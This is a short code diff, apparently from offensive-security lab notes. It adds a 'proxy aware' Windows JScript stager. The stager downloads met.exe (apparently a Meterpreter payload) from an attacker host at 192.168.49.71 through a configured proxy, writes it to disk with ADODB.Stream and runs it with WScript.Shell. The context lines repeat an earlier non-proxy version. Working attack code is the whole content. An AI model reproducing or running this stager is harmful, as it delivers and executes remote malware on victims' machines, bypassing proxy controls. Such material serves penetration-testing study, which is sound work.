@@ -18,3 +18,20 @@ var Stream = WScript.CreateObject('ADODB.Stream');
 	Stream.Close();
 }
 var r = new ActiveXObject("WScript.Shell").Run("met.exe");
+
+# Proxy aware
+var url = "http://192.168.49.71/met.exe";
+var Object = new ActiveXObject("Msxml2.ServerXMLHTTP.6.0");
+Object.setProxy(2, "192.168.71.12:3128", "*");
+Object.open('GET', url, false);
+Object.send();
+if (Object.status == 200){
+var Stream = WScript.CreateObject('ADODB.Stream');
+	Stream.Open();
+	Stream.Type = 1;
+	Stream.Write(Object.responseBody);
+	Stream.Position = 0;
+	Stream.SaveToFile("met.exe", 2);
+	Stream.Close();
+}
+var r = new ActiveXObject("WScript.Shell").Run("met.exe");
